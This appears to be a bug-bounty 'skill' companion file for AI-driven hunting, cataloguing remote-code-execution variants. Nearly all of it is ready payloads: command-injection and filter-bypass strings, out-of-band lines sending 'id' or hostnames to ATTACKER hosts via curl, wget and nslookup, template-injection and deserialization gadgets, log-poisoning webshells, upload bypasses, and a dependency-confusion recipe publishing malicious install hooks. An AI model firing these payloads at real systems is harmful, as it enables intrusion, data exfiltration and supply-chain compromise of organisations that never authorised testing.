# RCE — Exhaustive Attack-Vector Variant Matrix

Companion to `hunt-rce` (SKILL.md). That file carries the *method* + 6 composition
chains; this file is the **catalog of every variant** to fire once you have an exec
sink — or a primitive that can become one (upload, LFI, deser, injection). Run a
sink through the whole matrix before calling it closed.

## 1. Command injection — operator + filter-bypass matrix

### Operators to try (in order of prevalence, then exotic)
```
;id              |id             &&id            ||id
$(id)            `id`            $`id`           ${IFS}id
%0aid (newline)  %0d%0aid       $'\n'id
# shell redirection / piping
;cat /etc/passwd | grep root
;echo PAYLOAD > /tmp/x ; chmod +x /tmp/x ; /tmp/x
```

### Filter-bypass for blocked chars (`space` / `;` / `|` / `` ` `` / `$` / `/` / words)
```
# space bypass → $IFS, brace expansion, tab/newline
cat${IFS}/etc/passwd          {cat,/etc/passwd}          cat%09/etc/passwd
cat$IFS$9/etc/passwd          cat</etc/passwd

# semicolon blocked → newline, ||, &&, %0a
# pipe blocked → $(...), backtick, redirection
# $ blocked → ${IFS}, \x24, ${PATH:0:1} (yields '/'), ${#} (yields '0')

# command/keyword blocked (cat, curl, wget, bash, sh) → concat/encode
c""at /etc/passwd              ca""t /etc/passwd         'c'"a"t
$(tr '[A-Z]' '[a-z]'<<<"CAT")/etc/passwd
$(printf '\x63\x61\x74') /etc/passwd        # hex
$(printf '\143\141\164') /etc/passwd        # octal
base64_decode("Y2F0") | sh                   # base64 of command

# path traversal inside command
/usr/bin/find / -name flag.txt  # full path avoids PATH-order tricks
```

### Blind command injection → OOB proof (no output in body)
```
;curl http://$(id -u).ATTACKER.oast.fun/
;wget --post-data="$(id)" http://ATTACKER/
;nslookup $(whoami).ATTACKER.com
;ping -c 1 $(hostname).ATTACKER.com
;dig $(cat /etc/hostname).ATTACKER.com
# time-delay for boolean: ;sleep 5  vs ;sleep 0
# distinct: ;rm /tmp/x; sleep 3   (file-delete as a side-channel)
```
Proof bar: DNS/HTTP callback carrying command output, OR a measured time delta — not
"the field echoed back weird".

## 2. SSTI / template injection — full engine matrix

| engine | fingerprint | RCE payload (read `id`) |
|---|---|---|
| Jinja2 (Python) | `{{7*7}}` → 49 | `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}` |
| Jinja2 alt (no config) | | `{{ cycler.__init__.__globals__.os.popen('id').read() }}` |
| Twig (PHP) | `{{7*7}}` → 49 | `{{['id']|map('passthru')|join}}` or `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}` |
| Freemarker | `${7*7}` → 49 | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| Velocity | `#set($x=7*7)$x` | complex classloader chain |
| Thymeleaf (Spring) | `*{7*7}` | SpEL `*{T(java.lang.Runtime).getRuntime().exec('id')}` |
| Go text/template | `{{.}}` | funcs not by default; look for `{{env "…"}}` / `{{with secret …}}` (Nomad/Vault) |
| Handlebars/Mustache | `{{7*7}}` → literal | logic-less, but `{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}` (Node) |
| ERB (Ruby) | `<%= 7*7 %>` | `<%= system('id') %>` |
| EJS (Node) | `<%= 7*7 %>` | `<%- require('child_process').execSync('id') %>` |
| Smarty (PHP) | `{$smarty.version}` | `{system('id')}` (if `{php}` unsupported) |
| Mako | `${7*7}` → 49 | `${__import__('os').popen('id').read()}` |

**Polyglot first-shot**: `{{7*7}}${7*7}#{7*7}<%= 7*7 %>*{7*7}[[7*7]]` — presence of `49`
tells which engine rendered. Blind (no output) → `{{...os.popen('nslookup $(id).oast')...}}`.

## 3. Deserialization gadget matrix (per language)

The sink is "endpoint accepts serialized bytes". Map the byte format → gadget:

| language | sink format | gadget / tool |
|---|---|---|
| Java | Java serialization, SnakeYAML, XStream, JDK RMI, JSON (Jackson `enableDefaultTyping`) | `ysoserial` — CommonsCollections1-7, CommonsBeanutils1, Groovy1, Spring1/2, JDK7u21, Hibernate1, JSON1 |
| Java SnakeYAML | YAML `!!` | `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://att/x.jar"]]]]` (also JdbcRowSetImpl + ldap) |
| .NET | BinaryFormatter, ViewState, DataContractSerializer, LOS | `ysoserial.net` — TypeConfuseDelegate, TextFormattingRunProperties, WindowsIdentity, ViewState |
| PHP | `unserialize()`, `phar://` metadata | phpggc — Laravel/RCE1-5, Symfony, Monolog, Guzzle, Yii2, ThinkPHP |
| Python | `pickle.loads()`, PyYAML `yaml.load` | `__reduce__`/`__reduce_ex__` gadget (`os.system`), or `__setstate__` |
| Ruby | `Marshal.load`, `YAML.load` (Psych) | universal gadget `Gem::Requirement` → `Gem::SpecFetcher` → `Gem::Installer` (`i: x`) |
| Node | `serialize-javascript`, `node-serialize` (IIFE), `funcster` | `_$$ND_FUNC$$_function(){ require('child_process').execSync('id') }()` |
| Go | gob (rarely exploitable) | usually N/A — note as negative |

**Probe order:** detect the format by sending a single invalid byte and reading the
error stack (class name / "unserialize()"/"pickle"/"java.io.StreamCorruptedException"),
then reach for the matching tool's gadget list — start with the shortest chain, not
the most famous.

## 4. LFI / path traversal → RCE ladder (the "file read is the door" rule)

File-read alone is not RCE; each of these is the *second* half that turns it into exec:

| primitive | escalation | payload / trigger |
|---|---|---|
| LFI + log pollution | write PHP/shell into an access log, include it | `<?php system($_GET['c']);?>` in User-Agent → `include /var/log/apache2/access.log?c=id` |
| LFI + `/proc/self/environ` | HTTP headers become env vars → pollute with code | `User-Agent: <?php system('id');?>` then include `/proc/self/environ` |
| LFI + php filter chain | `php://filter` full toolchain (base64 + chain) | php_filter_chain_generator.py → `include "php://filter/…/resource=php://temp"` (no upload needed) |
| LFI + expect wrapper | `expect://` executes | `include "expect://id"` (PHP `expect` ext) |
| LFI + pearcmd (pearcmd.php) | pear CLI args via LFI | `include "pearcmd.php?+config-create+/&/<?=system($_GET[c])?>+/tmp/x.php"` |
| LFI + `/proc/self/fd/N` | read a process's open socket/file | `include /proc/self/fd/9` (FD riding through the request) |
| LFI + ssh-key / known-file write | poison `.ssh/authorized_keys` via a log/git hook | combined with another write primitive |
| LFI + `/dev/stdin` | inject via request body | `include /dev/stdin` + `php://input` style |

**php://filter chain** is the modern default for PHP-LFI→RCE (no file write, no upload,
works even when `allow_url_include=Off`) — run `php_filter_chain_generator` and include
the generated wrapped `php://temp`.

## 5. File upload → RCE matrix (bypass the extension/MIME gate)

| gate | bypass |
|---|---|
| extension blocklist | `.php5 .phtml .pht .phar .php7 .php.cgi .php.jpg .php/` `.asp .aspx .ashx .jsp .jspx .war .cer .shtml .so .cgi` |
| magic-byte check | polyglot: `GIF89a`+PHP, JPEG+PHP (`\xFF\xD8\xFF\xE0`+`<?php`), PNG+PHP; or XLSX/PDF embed |
| filename traversal | `../../shell.php`, `..%2f..%2f`, null byte `shell.php%00.jpg` (legacy) |
| MIME in Content-Type | serve actual code with `image/jpeg` header; server trusts it |
| double extension (Apache `.php.jpg` parse) | Apache `<FilesMatch>`/`AddHandler` multi-extension interpretation |
| `.htaccess` upload | upload `.htaccess` with `AddType application/x-httpd-php .jpg` then `.jpg` code |
| `.git` / SVG-in-img | SVG `<script>`/external entity, or `.git/config` overwrite |
| zip-slip | archive with `../../` entries (symmetric to file-based traversal) |

Confirm execution OR OOB (`?cmd=id` → output, or `?cmd=curl attacker`), never "the
file saved".

## 6. Config / framework-specific RCE sinks (grepped from the admin surface)

| product | sink | payload shape |
|---|---|---|
| syslog-ng | `destination` program() | `program("id")` |
| collectd | exec plugin | `Exec "user" "id"` |
| nomad | job template | `{{ runscript "id" }}` / `{{ env "…" }}` |
| ingress-nginx | annotation `configuration-snippet` | nginx config injection (`/x)(;.*;#` in path) |
| Jenkins | Script Console `/script` | `println "id".execute().text` |
| Tomcat | `/manager` + WAR deploy | upload a `.war` webshell |
| Grafana | data-source URL + provisioning | SSRF→RCE chains |
| GitLab/GB | markdown KaTeX/RDoc | deser / `rdoc` gadget |
| Wordpress | shortcode into double-quoted PHP | `";echo …;//` (CVE-2026-102425 class) |

## 7. Supply-chain / dependency-confusion RCE (no sink needed — lock the namespace)

```
1. Enumerate internal package names: JS bundles, package.json, error messages, public repos
   -> "@company/internal", "company-utils", unscoped "internal-utils"
2. Check public registry: npm view <name> version / pip index versions <name>
3. If absent: publish a HIGHER version with a postinstall/preinstall/`__init__` exec hook
   -> callback from the target's build farm = RCE on CI/CD (often prod creds)
```
Registry pivot: npm→PyPI→RubyGems→Maven Central→Hex→crates.io — the same unclaimed-name
test applies. Proof = OOB callback from the build host, not "the name was unregistered".

## 8. Escalation ladder / proof rungs

```
rung 1  input reflected into an exec context (no proof)      → NOT reportable
rung 2  template `{{7*7}}` → 49 (engine identified)          → Informational lead
rung 3  blind OOB callback carrying `id`/hostname            → Medium-High RCE
rung 4  visible `id`/`whoami` output in response             → High RCE
rung 5  privileged context: root / prod creds / cluster      → Critical
```

Every rung 3+ needs a unique-marker OOB callback or a captured `whoami`; the two-halves
rule from the main skill (bytes-arrive + bytes-interpreted) applies at every step.